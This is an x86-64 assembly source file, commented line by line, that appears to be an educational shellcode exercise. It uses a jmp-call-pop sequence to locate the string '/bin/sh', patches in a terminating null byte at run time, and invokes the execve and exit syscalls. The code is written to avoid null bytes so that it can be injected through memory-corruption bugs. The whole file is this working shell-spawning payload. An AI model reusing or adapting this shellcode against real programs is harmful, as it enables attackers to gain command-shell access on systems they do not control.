.section	.data
.section	.text
.globl		_start

_start:
	pushq	%rbp				#saves the base pointer
	movq	%rsp, %rbp			#current stack pointer -> base pointer
	jmp	data_items			#jump to end of this code to get the string(/bin/sh)

hop:
	popq	%rbx				#rbx holds the return value from call
	pushq	%rbp				#for the hop function saves the old base pointer
	movq	%rsp, %rbp			#current stack pointer -> new base pointer
	subq	$16, %rsp			#create a stack which has two rooms for parameters
	xor	%rdx, %rdx			#rdx value is equal to zero
	movq	%rbx, -16(%rbp)			#path value is attending  the upper room on the stack
	movq	%rdx, -8(%rbp)			#zero value is assigned to below room in the stack


	#REVERSE order parameters assigning for execve

	leaq    -16(%rbp), %rsi                 #Load the address of /bin/sh string into rsi
	movq    -16(%rbp), %rdi                 #Load the value of string (i.e. the path /bin/sh) into rdi
	jmp	addzero

syscallforexecve:
	xor	%rax, %rax			#rax value is equal to zero to prevent errors
        movb	$59, %al			#move sys_execve magic number to %al register
        syscall					#al is used because of eliminating zero values

	xor	%rax, %rax			#rax value is equal to zero to prevent errors
        movb	$60, %al			#move sys_exit magic number to %al register
	xor	%rcx, %rcx			#rcx value is equal to zero
	movq	%rcx, %rdi			#remove the path from the rdi
	syscall					#al is used for the same reason as above



addzero:
	movq	(%rdi), %r15
	rol	$8, %r15
	xor	%r15b, %r15b
	ror	$8, %r15
	movq	%r15, (%rdi)
	jmp	syscallforexecve

data_items:
        call    hop                             #call hop function
        .ascii  "/bin/sh1"			#with this ascii string
